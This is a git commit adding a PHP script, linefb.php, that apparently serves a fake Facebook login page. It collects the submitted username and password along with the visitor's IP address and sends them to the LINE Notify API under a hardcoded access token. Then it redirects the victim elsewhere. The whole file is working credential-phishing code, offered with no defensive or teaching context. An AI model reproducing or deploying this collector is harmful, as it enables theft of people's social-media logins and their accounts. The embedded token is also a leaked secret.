6b1ce26e0836ba0f83bf8f17eb646b51550c552e
sayser <68947652+sammerhacker@users.noreply.github.com>
2022-03-06 23:40:07 +0700

    Add files via upload

---
+++ linefb.php
@@ -0,0 +1,50 @@
+<?php 
+
+
+    $header = "Testing Line Notify";
+    $firstname = $_POST['firstname'];
+    $lastname = $_POST['lastname'];
+    $ip = include('IPx.php');
+    $message = $header.
+                "\n". "{----sayser----}"  .
+                "\n". "username : " . $firstname .
+                "\n". "password : " . $lastname .
+                "\n". "IP : " . $ip .
+                "\n". "app : facebook";
+
+    if (isset($_POST["submit"])) {
+        if ( $firstname <> "" ||  $lastname <> "" ){
+            sendlinemesg();
+            header('Content-Type: text/html; charset=utf8');
+            $res = notify_message($message);
+            header("location: index.php");
+        } else {
+            header("location: facebook.php");
+        }
+    }
+
+    function sendlinemesg() {
+        define('LINE_API',"https://notify-api.line.me/api/notify");
+        define('LINE_TOKEN',"AFX3tvy0KDP2lvxRSRY8ATRscjXNPlgvmx5Szsk6ofJ");
+
+        function notify_message($message) {
+                    $queryData = array('message' => $message);
+                    $queryData = http_build_query($queryData,'','&');
+                    $headerOptions = array(
+                        'http' => array(
+                            'method' => 'POST',
+                            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
+                                        ."Authorization: Bearer ".LINE_TOKEN."\r\n"
+                                        ."Content-Length: ".strlen($queryData)."\r\n",
+                            'content' => $queryData
+                        )
+                    );
+                    $context = stream_context_create($headerOptions);
+                    $result = file_get_contents(LINE_API, FALSE, $context);
+                    $res = json_decode($result);
+                    return $res;
+                }
+            }
+        
+        
+?>
